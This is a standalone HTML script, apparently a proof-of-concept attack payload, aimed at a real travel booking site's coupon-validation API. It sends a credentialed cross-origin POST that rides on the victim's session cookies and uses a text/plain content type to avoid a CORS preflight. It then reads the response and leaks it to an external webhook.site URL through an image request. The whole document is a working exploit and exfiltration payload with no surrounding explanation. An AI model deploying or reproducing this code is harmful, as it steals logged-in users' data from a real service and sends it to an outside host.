<script>
fetch("https://mapi.makemytrip.com/clientbackend/cg/validate-coupon/DESKTOP/2?language=eng&region=in&currency=INR&idContext=B2C&countryCode=IN&requestId=1635a106-b63b-4c0c-a233-c493d61c876f", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "text/plain"
  },
  body: JSON.stringify({
    countryCode: "IN",
    txnKey: "cc8074a2-884a-455b-a381-0c1ada81dd0a",
    couponCode: "MMTMYCASH",
    removeCoupon: false,
    userLocation: {
      city: "CTKABA",
      state: "STTUNI",
      country: "TUN"
    },
    requestDetails: {
      journeyId: "18735756049e6da3d9-7e5a-47da-bb5b-08abf535d91a",
      requestId: "1635a106-b63b-4c0c-a233-c493d61c876f",
      sessionId: "f6792ed6-55c1-4dcc-a771-d8a4a613c676"
    }
  })
})
.then(res => res.text())
.then(body => {
  // encodeURIComponent to safely pass body as URL param
  let encoded = encodeURIComponent(body.slice(0, 2000)); // truncate to avoid URL length issues
  let exfilUrl = "https://webhook.site/b1dea0eb-0f15-478b-8cc8-f42f6e2b7d23?leak=" + encoded;

  // Send via image to avoid CORS
  let img = new Image();
  img.src = exfilUrl;
});
</script>
